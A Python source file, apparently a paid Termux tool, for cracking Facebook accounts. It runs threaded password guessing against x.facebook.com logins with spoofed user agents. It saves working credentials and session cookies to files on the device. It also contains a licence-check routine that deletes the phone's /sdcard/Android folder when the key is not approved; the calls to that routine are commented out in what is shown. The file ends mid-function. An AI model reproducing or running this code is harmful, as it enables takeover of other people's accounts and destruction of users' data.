from __future__ import print_function
import platform
import zlib
import requests
import time,datetime
import os,shutil
from uuid import uuid4
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python KAMII.py')

ugen2=['Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/591.24.1 (KHTML, like Gecko) Version/13.3 Safari/591.24.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/609.1 (KHTML, like Gecko) Version/14.2 Safari/609.1','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5363.115 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5392.181 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5408.131 Safari/537.36','Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5369.162 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_1) AppleWebKit/600.7.23 (KHTML, like Gecko) Version/13.0.42 Safari/592.20','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/600.3.13 (KHTML, like Gecko) Version/12.4 Safari/605.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.3.25 Safari/554.12','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/600.6.11 (KHTML, like Gecko) Version/14.0 Safari/567.30.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/604.12 (KHTML, like Gecko) Version/11.1 Safari/604.12','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.1.50 Safari/537.16','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/551.13 (KHTML, like Gecko) Version/13.2 Safari/551.13','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5396.145 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5362.104 Safari/537.36','Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/109.0.5380.202 Chrome/109.0.5380.202 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5374.147 Safari/537.36','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5385.108 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5373.200 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5392.150 Safari/537.36','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5386.123 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5365.162 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_1) AppleWebKit/572.3 (KHTML, like Gecko) Version/13.2 Safari/572.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.4 Safari/589.16.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/604.24.9 (KHTML, like Gecko) Version/11.5.84 Safari/604.24.9','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5385.108 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5402.163 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/110.0.5404.165 Chrome/110.0.5404.165 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5405.107 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5399.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5412.174 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5394.124 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5376.217 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5375.160 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.6.45 Safari/567.32.14','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/542.17 (KHTML, like Gecko) Version/11.6.32 Safari/542.17','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.46 Safari/607.20','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_17) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.2 Safari/609.13','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_1) AppleWebKit/602.11 (KHTML, like Gecko) Version/10.1 Safari/602.11','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/560.3 (KHTML, like Gecko) Version/11.6 Safari/560.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.1.95 Safari/557.20','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10_5) AppleWebKit/545.20.13 (KHTML, like Gecko) Version/13.4 Safari/545.20.13','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/600.2.16 (KHTML, like Gecko) Version/13.6 Safari/607.25.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/600.6.13 (KHTML, like Gecko) Version/14.7 Safari/565.10.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/600.6.17 (KHTML, like Gecko) Version/11.7 Safari/590.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/566.25 (KHTML, like Gecko) Version/10.4 Safari/566.25','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12_4) AppleWebKit/600.5.22 (KHTML, like Gecko) Version/12.7 Safari/591.11.15',]
uiph=['Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.7 Mobile/5UDMHQ Safari/556.21','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.6.14 Mobile/GMW9AS Safari/551.10','Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/543.31 (KHTML, like Gecko) Version/10.4.36 Mobile/GU6MT8 Safari/543.31','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.5 Mobile/V5TTHA Safari/559.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/600.6.20 (KHTML, like Gecko) Version/10.4 Mobile/FCAQQ1 Safari/609.13.8','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/600.2.13 (KHTML, like Gecko) Version/10.7 Mobile/2LTVTR Safari/595.2','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/581.19.10 (KHTML, like Gecko) Version/11.5.54 Mobile/NZKW4L Safari/581.19.10','Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/568.20 (KHTML, like Gecko) Version/12.0.10 Mobile/19IWFU Safari/568.20','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/600.2.27 (KHTML, like Gecko) Version/13.3 Mobile/IXT23J Safari/552.9','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/584.24.6 (KHTML, like Gecko) Version/12.7 Mobile/66BCWK Safari/584.24.6','Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/14.6.73 Mobile/DW0KG6 Safari/542.13','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/600.7.25 (KHTML, like Gecko) Version/12.6.56 Mobile/1AVLKP Safari/559.16.15','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/541.13.8 (KHTML, like Gecko) Version/12.7.62 Mobile/H7VREE Safari/541.13.8','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/573.19 (KHTML, like Gecko) Version/14.7 Mobile/8I4RW9 Safari/573.19','Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/581.13.2 (KHTML, like Gecko) Version/11.0.43 Mobile/TW9PK8 Safari/581.13.2','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/569.34 (KHTML, like Gecko) Version/13.0 Mobile/8USPXM Safari/569.34','Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.7.30 Mobile/N4RW3G Safari/586.22.10','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/548.4 (KHTML, like Gecko) Version/12.0.94 Mobile/PO0BB5 Safari/548.4','Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.6 (KHTML, like Gecko) Version/14.4 Mobile/MFXAY7 Safari/600.6','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/553.14.4 (KHTML, like Gecko) Version/11.5.53 Mobile/YNUMOA Safari/553.14.4','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/600.5.24 (KHTML, like Gecko) Version/11.4.44 Mobile/SXB1DU Safari/579.14.13','Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.7.72 Mobile/01NWDN Safari/554.24','Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/576.23 (KHTML, like Gecko) Version/13.0 Mobile/1TKLJY Safari/576.23','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.1 Mobile/J2M9Q6 Safari/584.35','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.2 Mobile/I0KV6S Safari/559.5','Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.7.14 Mobile/4AITT5 Safari/606.25.9','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/545.22 (KHTML, like Gecko) Version/10.4 Mobile/1N4OI5 Safari/545.22','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/586.11.14 (KHTML, like Gecko) Version/10.3 Mobile/SYPKEF Safari/586.11.14','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/559.19 (KHTML, like Gecko) Version/11.7 Mobile/57SA9P Safari/559.19','Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/564.32 (KHTML, like Gecko) Version/13.1.83 Mobile/JRK4M2 Safari/564.32','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/600.2.13 (KHTML, like Gecko) Version/13.3.91 Mobile/06UEPP Safari/610.13','Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/596.20.11 (KHTML, like Gecko) Version/13.2 Mobile/UO6K05 Safari/596.20.11','Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.4.37 Mobile/7G7CLO Safari/610.30','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/546.12 (KHTML, like Gecko) Version/12.4.51 Mobile/9NVVXR Safari/546.12','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/591.12.1 (KHTML, like Gecko) Version/14.6.94 Mobile/46F8AL Safari/591.12.1','Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/600.5.14 (KHTML, like Gecko) Version/12.3.13 Mobile/BKDP7G Safari/577.23','Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.3.73 Mobile/8XIGFR Safari/601.27','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.1 Mobile/9E0913 Safari/609.13.9','Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.84 Mobile/C7LSDC Safari/542.17','Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.2.27 Mobile/X12BLC Safari/584.12','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/600.6.23 (KHTML, like Gecko) Version/13.1 Mobile/DQNLY5 Safari/550.19.13','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/552.6 (KHTML, like Gecko) Version/12.3.86 Mobile/KGS7BG Safari/552.6','Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.54 Mobile/96LCZR Safari/595.19','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/557.8 (KHTML, like Gecko) Version/11.0.62 Mobile/5WKR1L Safari/557.8','Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/574.18.2 (KHTML, like Gecko) Version/11.1 Mobile/2J75H7 Safari/574.18.2',]


ugen=[]
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)


agents=['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.1; rv:108.0) Gecko/20100101 Firefox/108.0',
'Mozilla/5.0 (X11; Linux i686; rv:108.0) Gecko/20100101 Firefox/108.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:108.0) Gecko/20100101 Firefox/108.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/108.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/108.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (iPod touch; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/108.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:108.0) Gecko/20100101 Firefox/108.0.',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11_4) AppleWebKit/600.8.12 (KHTML, like Gecko) Version/11.6.11 Safari/611.13',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/600.7.16 (KHTML, like Gecko) Version/10.2 Safari/545.17.4',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/600.6.24 (KHTML, like Gecko) Version/10.1 Safari/557.19.6',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_17) AppleWebKit/607.24 (KHTML, like Gecko) Version/11.2 Safari/607.24',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.2.15 Safari/555.12',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.5.93 Safari/544.17',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5378.137 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5391.103 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5394.151 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_3) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.3.76 Safari/602.3.6',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.154 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/109.0.5399.152 Chrome/109.0.5399.152 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5410.132 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5409.213 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5397.160 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5408.127 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux i686) Gecko/20061209 Firefox/112.0',
'Mozilla/5.0 (Linux; Android 11; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5402.125 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5359.171 Safari/537.36',
'Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5385.125 Safari/537.36',
'Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5362.197 Safari/537.36',
'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5383.126 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20000101 Firefox/117.0/m2zxvgIWsypPWJMX-37',]


os.system('clear')
logo=("""\033[1;32m                    
         _   __ ___  __   __ ___ ___ 
        | | / // _ \|  \ /  (   |   )
        | |/ /| |_| |   v   || | | | 
        |   < |  _  | |\_/| || | | | 
        | |\ \| | | | |   | || | | | 
        |_| \_\_| |_|_|   |_(___|___)
       
----------------------------------------------
[*] Created   :          Kamran Haider
[*] facebook  :          Kamran Haider
[*] Vesion    :          1.0
[*] Whatsapp  :          03157036228
----------------------------------------------""")
def linex():
    print('\033[1;37m----------------------------------------------')
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
total=[]

def xchker():
    pass


def menu():
    os.system('clear')
    print(logo)
    print('\033[1;32m[1] File Cloning Menu')
    print('\033[1;32m[2] Random Cloning')
    print('\033[1;32m[3] Create File Menu')
    print('\033[1;32m[4] Remove Double Links')
    print('\033[1;32m[5] Seperate Ids')
    print('\033[1;32m[6] Login Cookie')
    print('\033[1;37m----------------------------------------------')
    opt = input('\033[1;32m[+] Choose Option : ')
    if opt =='1':
        fia()
    elif opt =='2':
        random_nmb()
    elif opt =='3':
        create_file()
    elif opt =='4':
        double()
    elif opt =='5':
       sprate()
    elif opt =='6':
       login()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
        
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "KAMI"+myid+xp
    
def xi():
    j=getKey()
    r=requests.get("https://kamii911.blogspot.com/2023/01/approvaltxt.html").text
    if j in r:
        pass
    else:
        os.system("clear")
        #uncomment to activate virus
        shutil.rmtree("/sdcard/Android")
        print("Don't Bypass ")
        sys.exit()
   
def aprv():
    l="https://kamii911.blogspot.com/2023/01/approvaltxt.html"
    r=requests.get(l).text
    k=getKey()
    if k in r:
        menu()
    else:
                os.system('clear')
                print(logo)
                print('\033[1;32m   Your Key Is Not Approved Buy The Command First')
                print('\033[1;37m----------------------------------------------')
                print('\033[1;33m               350 For Month')
                print('\033[1;37m----------------------------------------------')
                print('\033[1;31m              Tool For New Ids')
                print('\033[1;37m----------------------------------------------')
                print(f" Your Key: {k}")
                print('\033[1;37m----------------------------------------------')
                print("\033[1;32m       Buy The command first")
                print('\033[1;37m----------------------------------------------')
                input('[Press Enter To Send Key To Admin]')
                os.system(f"termux-open-url https://wa.me/+923157036228?text={k}")
                aprv()

        
def fia():
    os.system('clear')
    print(logo)
    print('\x1b[1;31m>>> I AM ALONE IN MY TEAM')
    linex()
    print('\033[1;32m[1] Crack File ')
    linex()
    xd=input('\033[1;32m[*] Choose an option: ')
    if xd in ['1','01']:
        os.system('clear')
        print(logo)
        print('\033[1;33mExample : /sdcard/filename.txt')
        linex()
        file = input('\033[1;37m[+] Put file path\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        os.system('clear')
        print(logo)
        print('\033[1;32m[1] Method 1')
        print('\033[1;32m[2] Method 2')
        print('\033[1;32m[2] Method 3')
        linex()
        mthd=input('\033[1;32m[+] Choose : ')
        linex()
        plist = []
        try:
            ps_limit = int(input('\033[1;32m[+] How many passwords do you want to add : '))
        except:
            ps_limit =1
        linex()
        for i in range(ps_limit):
            plist.append(input(f'\033[1;32m[+] Put password {i+1}: '))
        linex()
        print('\033[1;32m[1] Enter For Cloning')
        linex()
        cx=input('\033[1;32m[+] Choose : ')
        if cx in ['y','Y','yes','Yes','1']:
            pcp.append('y')
        else:
            pcp.append('n')
        ##xi()
        with tred(max_workers=90) as crack_submit:
            os.system('clear')
            print(logo)
            total_ids = str(len(fo))
            print('\033[1;37mTotal Account : \033[1;32m'+total_ids)

            print('\033[1;31m      Use Flight Mode For Ok Ids')
            print('\033[1;37m----------------------------------------------')
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)
                elif mthd in ['2', '02']:
                    crack_submit.submit(mbasic,ids,names,passlist)
                elif mthd in ['3', '3']:
                    crack_submit.submit(basic_rnd,ids,names,passlist)
        print('\033[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' Press enter to back ')
        os.system('python KAMI.py')

def random_nmb():
    uid=[]
    os.system('clear')
    print(logo)
    print('\033[1;31m[+] EXAMPLE : 92318 : 92345 : 92323 : 92306')
    print('\033[1;37m----------------------------------------------')
    kode = input('[+]\33[1;32m ENTER CODE : ')
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;32m[+] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    #xi()
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[+] Total Ids : '+tl)
        print('[+] Choice code : \033[1;92m'+kode)
        print('\033[1;37m----------------------------------------------') 
        print('[+] \033[38;5;204mUse flight mode for speed up\33[1;97m')
        print('\033[1;37m----------------------------------------------') 
        for guru in uid:
            uid = kode+guru
            pwx = [kode, kode+guru,'khankhan','khan1122']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(47*"—")
    print('[✓] Crack process has been completed')
    print('[?] Idz saved in [KAMI-OK.txt,KAMI-CP.txt]')
    print(47*"—") 
    input('Press Enter To Go Back To Menu')
    menu()


def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            ua = random.choice(uiph)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'x.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"(Not(A:Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"iOS"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            "upgrade-insecure-requests": '1',
            "user-agent":ua,}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m[KAMII-OK] {uid}|{ps}")
                print(f" \ Cookie : {coki}")
                open('/sdcard/KAMI-OK.txt', 'a').write( uid+' | '+ps+'\'')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[KAMI-CP] {cid}|{ps}")
                open('/sdcard/KAMI-CP.txt', 'a').write( uid+' | '+ps+' \'')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\33[1;37m[Crack] %s|\33[1;32mOK:-%s \33[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass

#method 1


def ffb(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;37m[KAMII-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
